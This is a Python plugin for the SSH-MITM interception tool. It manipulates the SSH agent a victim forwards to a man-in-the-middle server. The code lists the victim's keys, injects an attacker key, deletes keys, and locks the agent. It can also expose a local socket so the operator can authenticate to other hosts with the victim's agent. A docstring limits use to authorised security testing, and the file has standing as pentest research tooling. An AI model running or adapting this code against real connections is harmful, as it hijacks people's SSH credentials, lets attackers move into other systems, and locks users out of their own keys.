"""Agent interaction plugin for SSH-MITM.

Demonstrates the operations a MITM server can perform on a forwarded SSH agent:

- List all keys stored in the agent (always logged)
- Remove all keys (``--agent-remove-all-keys``)
- Remove a specific key by index (``--agent-remove-key INDEX``)
- Lock the agent with a password (``--agent-lock``)
- Inject a local private key into the agent (``--agent-inject-key PATH``)

.. warning::

    These options are for authorised security testing and research only.
    Using them against systems you do not own or have explicit permission
    to test is illegal.

Usage example::

    ssh-mitm server --ssh-interface sshmitm.plugins.agent.agentinteract.AgentInteractForwarder \\
        --agent-remove-all-keys
"""

import hashlib
import logging
import threading
from base64 import b64encode
from typing import TYPE_CHECKING

import paramiko
from colored.colored import attr, fg

from sshmitm.forwarders.agent import AgentLocalSocket
from sshmitm.moduleparser.colors import Colors
from sshmitm.plugins.ssh.mirrorshell import SSHMirrorForwarder

if TYPE_CHECKING:
    import sshmitm
    from sshmitm.forwarders.agent import AgentProxy


def _sha256_fingerprint(key_bytes: bytes) -> str:
    digest = hashlib.sha256(key_bytes).digest()
    return "SHA256:" + b64encode(digest).decode().rstrip("=")


class AgentInteractForwarder(SSHMirrorForwarder):
    """SSH forwarder that interacts with the client's forwarded SSH agent.

    Extends :class:`SSHMirrorForwarder` with optional agent operations that
    execute once the SSH session is fully established (inside ``forward()``),
    ensuring the agent channel is ready before any messages are sent.

    All operations target the *client's* agent via the SSH agent-forwarding
    channel — identical to what a malicious SSH server could do after a user
    connects with ``ForwardAgent yes``.
    """

    @classmethod
    def parser_arguments(cls) -> None:
        super().parser_arguments()
        plugin_group = cls.argument_group()
        plugin_group.add_argument(
            "--agent-inject-key",
            dest="agent_inject_key",
            default=None,
            metavar="KEYFILE",
            help=(
                "path to a private key file to inject into the forwarded agent "
                "(supports RSA, Ed25519, ECDSA)"
            ),
        )
        plugin_group.add_argument(
            "--agent-remove-key",
            dest="agent_remove_key",
            type=int,
            default=None,
            metavar="INDEX",
            help="remove the key at position INDEX (0-based) from the forwarded agent",
        )
        plugin_group.add_argument(
            "--agent-remove-all-keys",
            dest="agent_remove_all_keys",
            action="store_true",
            default=False,
            help="remove all keys from the forwarded agent",
        )
        plugin_group.add_argument(
            "--agent-lock",
            dest="agent_lock",
            action="store_true",
            default=False,
            help="lock the forwarded agent with --agent-lock-password",
        )
        plugin_group.add_argument(
            "--agent-lock-password",
            dest="agent_lock_password",
            default="",
            metavar="PASSWORD",
            help="password used to lock the agent (default: empty string, rejected by most agents)",
        )
        plugin_group.add_argument(
            "--agent-expose-socket",
            dest="agent_expose_socket",
            action="store_true",
            default=False,
            help="expose a local Unix socket for the forwarded agent (use with ssh-add)",
        )

    def __init__(self, session: "sshmitm.session.Session") -> None:
        super().__init__(session)
        self._agent_local_socket: AgentLocalSocket | None = None

    def close_session(self, channel: "paramiko.Channel") -> None:
        if self._agent_local_socket is not None:
            self._agent_local_socket.close()
            self._agent_local_socket = None
        super().close_session(channel)

    def forward(self) -> None:
        # Agent operations run in a daemon thread so that invoke_shell() is not
        # delayed — the client gets a shell immediately while ops proceed in the
        # background.  Each individual operation already has a socket timeout and
        # an except-block, so failures are logged without crashing the session.
        agent = self.session.agent
        if agent is not None:
            if self.args.agent_expose_socket:
                self._agent_local_socket = AgentLocalSocket(agent.transport)
                sock = self._agent_local_socket.socket_path
                sid = self._sid(self.session)

                def _cmd(suffix: str) -> str:
                    return Colors.stylize(
                        f"SSH_AUTH_SOCK={sock} {suffix}",
                        fg("light_blue") + attr("bold"),
                    )

                logging.info(
                    "%s %s - agent socket ready, interact with client's agent"
                    " - docs: https://docs.ssh-mitm.at/user_guide/sshagent.html",
                    Colors.emoji("information"),
                    sid,
                )
                logging.info(
                    "%s %s - ssh-add:  %s",
                    Colors.emoji("information"),
                    sid,
                    _cmd("ssh-add -l"),
                )
                logging.info(
                    "%s %s - ssh:      %s",
                    Colors.emoji("information"),
                    sid,
                    _cmd("ssh user@host"),
                )
            threading.Thread(
                target=self._run_agent_ops,
                args=(self.session, agent),
                daemon=True,
            ).start()
        super().forward()

    def _run_agent_ops(self, session: "sshmitm.session.Session", agent: "AgentProxy") -> None:
        try:
            self._log_keys(session, agent)
            # Order matters: inject before remove, lock last
            if self.args.agent_inject_key:
                self._inject_key(session, agent)
            if self.args.agent_remove_key is not None:
                self._remove_key(session, agent)
            if self.args.agent_remove_all_keys:
                self._remove_all_keys(session, agent)
            if self.args.agent_lock:
                self._lock(session, agent)
        except Exception:
            logging.exception(
                "%s %s - agent: unexpected error during agent operations",
                Colors.emoji("warning"),
                self._sid(session),
            )

    # ------------------------------------------------------------------ #
    # Private helpers                                                      #
    # ------------------------------------------------------------------ #

    def _sid(self, session: "sshmitm.session.Session") -> str:
        return Colors.stylize(str(session.sessionid), fg("light_blue") + attr("bold"))

    def _log_keys(self, session: "sshmitm.session.Session", agent: "AgentProxy") -> None:
        keys = agent.get_keys()
        if not keys:
            logging.info(
                "%s %s - agent: no keys found in forwarded agent",
                Colors.emoji("information"),
                self._sid(session),
            )
            return
        for i, key in enumerate(keys):
            logging.info(
                "%s %s - agent key [%d]: %s %s",
                Colors.emoji("information"),
                self._sid(session),
                i,
                key.get_name(),
                _sha256_fingerprint(key.asbytes()),
            )

    def _inject_key(self, session: "sshmitm.session.Session", agent: "AgentProxy") -> None:
        path = self.args.agent_inject_key
        success = agent.inject_key_from_file(path)
        if success:
            logging.warning(
                "%s %s - agent: injected key from %s",
                Colors.emoji("warning"),
                self._sid(session),
                path,
            )
        else:
            logging.warning(
                "%s %s - agent: failed to inject key from %s",
                Colors.emoji("warning"),
                self._sid(session),
                path,
            )

    def _remove_key(self, session: "sshmitm.session.Session", agent: "AgentProxy") -> None:
        keys = agent.get_keys()
        idx = self.args.agent_remove_key
        if idx >= len(keys):
            logging.warning(
                "%s %s - agent: key index %d out of range (%d key(s) present)",
                Colors.emoji("warning"),
                self._sid(session),
                idx,
                len(keys),
            )
            return
        key = keys[idx]
        success = agent.remove_key(key)
        if success:
            logging.warning(
                "%s %s - agent: removed key [%d] %s %s",
                Colors.emoji("warning"),
                self._sid(session),
                idx,
                key.get_name(),
                _sha256_fingerprint(key.asbytes()),
            )
        else:
            logging.warning(
                "%s %s - agent: failed to remove key [%d]",
                Colors.emoji("warning"),
                self._sid(session),
                idx,
            )

    def _remove_all_keys(self, session: "sshmitm.session.Session", agent: "AgentProxy") -> None:
        success = agent.remove_all_keys()
        if success:
            logging.warning(
                "%s %s - agent: removed all keys from forwarded agent",
                Colors.emoji("warning"),
                self._sid(session),
            )
        else:
            logging.warning(
                "%s %s - agent: failed to remove all keys",
                Colors.emoji("warning"),
                self._sid(session),
            )

    def _lock(self, session: "sshmitm.session.Session", agent: "AgentProxy") -> None:
        password = self.args.agent_lock_password
        success = agent.lock(password)
        if success:
            logging.warning(
                "%s %s - agent: locked forwarded agent",
                Colors.emoji("warning"),
                self._sid(session),
            )
        else:
            logging.warning(
                "%s %s - agent: failed to lock agent (already locked, or empty password rejected)",
                Colors.emoji("warning"),
                self._sid(session),
            )
